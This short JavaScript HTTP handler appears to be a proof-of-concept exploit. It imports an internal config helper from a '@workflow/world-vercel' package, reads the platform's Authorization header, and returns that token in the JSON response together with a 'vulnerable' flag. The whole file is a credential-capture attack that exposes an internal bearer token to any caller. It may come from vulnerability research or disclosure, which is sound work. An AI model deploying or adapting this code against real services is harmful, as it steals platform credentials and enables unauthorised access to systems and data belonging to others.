import { getHttpConfig } from '@workflow/world-vercel/utils';
export default async function handler(req, res) {
    try {
        const config = await getHttpConfig(); 
        const authHeader = config.headers.get('Authorization');
        res.status(200).json({
            vulnerable: authHeader ? "YES" : "NO",
            captured_header: authHeader ? authHeader : "none"
        });
    } catch (err) { res.status(500).json({ error: err.message }); }
}
